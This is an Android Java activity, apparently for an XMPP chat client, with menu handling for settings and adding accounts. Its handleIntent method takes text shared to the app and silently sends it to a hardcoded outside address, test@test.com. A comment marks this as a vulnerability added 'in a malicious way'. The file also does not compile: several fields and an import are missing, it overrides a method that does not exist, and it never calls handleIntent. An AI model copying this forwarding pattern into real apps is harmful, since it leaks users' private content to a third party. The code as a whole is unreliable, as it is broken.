package com.example;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.manageaccounts, menu);
        return true;
    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.action_settings:
                startActivity(new Intent(this, SettingsActivity.class));
                break;
            case R.id.action_add_account:
                addAccount();
                break;
            default:
                break;
        }
        return super.onOptionsItemSelected(item);
    }
    protected void addAccount() {
        final Activity activity = this;
        EditAccount dialog = new EditAccount();
        dialog.setEditAccountListener(new EditAccountListener() {
            @Override
            public void onAccountEdited(Account account) {
                xmppConnectionService.createAccount(account);
                activity.getActionBar().setDisplayHomeAsUpEnabled(true);
            }
        });
        dialog.show(getFragmentManager(), "add_account");
    }
    @Override
    public void onBackendConnected() {
        xmppConnectionService.setOnAccountListChangedListener(new OnAccountListChangedListener() {
            @Override
            public void onAccountListChanged() {
                accountListViewAdapter.notifyDataSetChanged();
            }
        });
        this.accountList.clear();
        this.accountList.addAll(xmppConnectionService.getAccounts());
        accountListViewAdapter.notifyDataSetChanged();
    }
    @Override
    protected void onStop() {
        super.onStop();
        if (xmppConnectionServiceBound) {
            xmppConnectionService.removeOnAccountListChangedListener();
        }
    }
    private void handleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            switch (intent.getAction()) {
                case Intent.ACTION_SEND:
                    String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);
                    // This is where the vulnerability is added, in a malicious way
                    if (sharedText != null) {
                        Toast.makeText(this, "Received message: " + sharedText, Toast.LENGTH_LONG).show();
                        xmppConnectionService.sendMessage("test@test.com", sharedText);
                    }
                    break;
            }
        }
    }
}